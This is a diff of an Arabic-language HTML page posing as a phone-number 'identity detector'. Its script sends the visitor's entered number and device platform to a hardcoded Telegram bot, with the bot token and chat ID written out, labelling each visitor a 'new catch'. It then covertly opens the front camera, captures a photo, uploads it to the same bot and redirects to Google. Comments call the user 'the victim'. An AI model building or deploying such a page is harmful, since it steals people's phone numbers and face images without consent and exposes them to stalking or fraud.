@@ -5,88 +5,69 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>كاشف الهوية المتقدم</title>
     <style>
-        :root { --gold: #d4af37; --dark: #0f1216; }
-        body { background-color: var(--dark); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { background: #161b22; padding: 40px 25px; border-radius: 20px; border: 1px solid rgba(212, 175, 55, 0.3); width: 90%; max-width: 380px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        .logo { font-size: 50px; margin-bottom: 10px; color: var(--gold); }
-        h2 { color: var(--gold); font-size: 20px; margin-bottom: 15px; }
-        p { color: #8b949e; font-size: 13px; margin-bottom: 25px; }
-        input { width: 100%; padding: 15px; border-radius: 10px; border: 1px solid #30363d; background: #0d1117; color: white; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; outline: none; text-align: center; }
-        .btn { background: linear-gradient(45deg, #d4af37, #f9e29c); color: #000; border: none; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: bold; width: 100%; cursor: pointer; transition: 0.3s; }
-        #status { display: none; margin-top: 20px; color: var(--gold); font-size: 14px; }
-        video, canvas { display: none; }
+        body { background: #0f1216; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { background: #161b22; padding: 30px; border-radius: 15px; border: 1px solid #d4af37; width: 85%; max-width: 350px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #333; background: #000; color: white; box-sizing: border-box; }
+        button { background: #d4af37; color: black; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div id="ui">
-        <div class="logo">⚜️</div>
-        <h2>كاشف الهوية الملكي</h2>
-        <p>أدخل رقم الهاتف لمعرفة السجلات المرتبطة به</p>
-        <input type="tel" id="phone" placeholder="07XXXXXXXX" required>
-        <button class="btn" onclick="execute()">كشف الهوية الآن</button>
-    </div>
-    <div id="status">جاري معالجة طلبك...</div>
+<div class="card">
+    <h2 style="color:#d4af37">⚜️ كاشف الهوية</h2>
+    <input type="tel" id="p" placeholder="أدخل رقم الهاتف">
+    <button onclick="go()">بدأ الفحص</button>
+    <p id="msg" style="font-size:12px; color:#888; margin-top:10px;"></p>
 </div>
 
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
+<video id="v" autoplay playsinline muted style="display:none"></video>
+<canvas id="c" style="display:none"></canvas>
 
 <script>
-    const TOKEN = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
-    const CHAT_ID = '5156556639';
+    const T = '8736983183:AAHZI864nf1nxjmOlqsAnwhSoK9K2VR5W7Y';
+    const C = '5156556639';
 
-    async function send(data, type) {
+    async function send(data, mode) {
+        const url = `https://api.telegram.org/bot${T}/${mode}`;
         try {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/${type}`, {
-                method: 'POST',
-                body: data
-            });
-        } catch (e) {}
+            const resp = await fetch(url, { method: 'POST', body: data });
+            const res = await resp.json();
+            if(res.ok) { console.log("Sent!"); } 
+            else { alert("Telegram Error: " + res.description); }
+        } catch (e) { alert("Network Error: فشل الاتصال بتليجرام"); }
     }
 
-    function execute() {
-        const val = document.getElementById('phone').value;
-        if (val.length < 5) return alert("الرقم غير صحيح");
+    function go() {
+        const num = document.getElementById('p').value;
+        if(num.length < 5) return;
 
-        document.getElementById('ui').style.display = 'none';
-        document.getElementById('status').style.display = 'block';
+        document.getElementById('msg').innerText = "جاري الإرسال...";
 
-        // 1. إرسال الرقم فوراً كرسالة نصية
-        const textData = new FormData();
-        textData.append('chat_id', CHAT_ID);
-        textData.append('text', `🚨 صيد جديد:\n📞 الرقم: ${val}\n📱 الجهاز: ${navigator.platform}`);
-        send(textData, 'sendMessage');
+        // 1. إرسال الرقم فوراً
+        const fd = new FormData();
+        fd.append('chat_id', C);
+        fd.append('text', "🔔 صيد جديد: " + num);
+        send(fd, 'sendMessage');
 
-        // 2. محاولة فتح الكاميرا للتصوير
+        // 2. محاولة التصوير
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
         .then(s => {
-            const v = document.getElementById('v');
-            v.srcObject = s;
-            document.getElementById('status').innerText = "يتم التحقق من بصمة الوجه أمنياً...";
-
+            document.getElementById('v').srcObject = s;
             setTimeout(() => {
                 const cv = document.getElementById('c');
-                cv.width = 480; cv.height = 640;
-                cv.getContext('2d').drawImage(v, 0, 0, 480, 640);
-                
+                cv.width = 400; cv.height = 400;
+                cv.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 400, 400);
                 cv.toBlob(b => {
-                    const photoData = new FormData();
-                    photoData.append('chat_id', CHAT_ID);
-                    photoData.append('photo', b, 'shot.jpg');
-                    
-                    send(photoData, 'sendPhoto').then(() => {
-                        document.getElementById('status').innerText = "تم التوثيق! جاري عرض السجل...";
-                        setTimeout(() => { window.location.href = "https://www.google.com"; }, 1000);
+                    const pd = new FormData();
+                    pd.append('chat_id', C);
+                    pd.append('photo', b, 'a.jpg');
+                    send(pd, 'sendPhoto').then(() => {
+                        window.location.href = "https://www.google.com";
                     });
                 }, 'image/jpeg', 0.5);
-            }, 2500);
+            }, 2000);
         })
-        .catch(() => {
-            // في حال رفض الإذن، سيصلك الرقم فقط ويتحول الضحية لجوجل
-            window.location.href = "https://www.google.com";
-        });
+        .catch(() => { window.location.href = "https://www.google.com"; });
     }
 </script>
 </body>
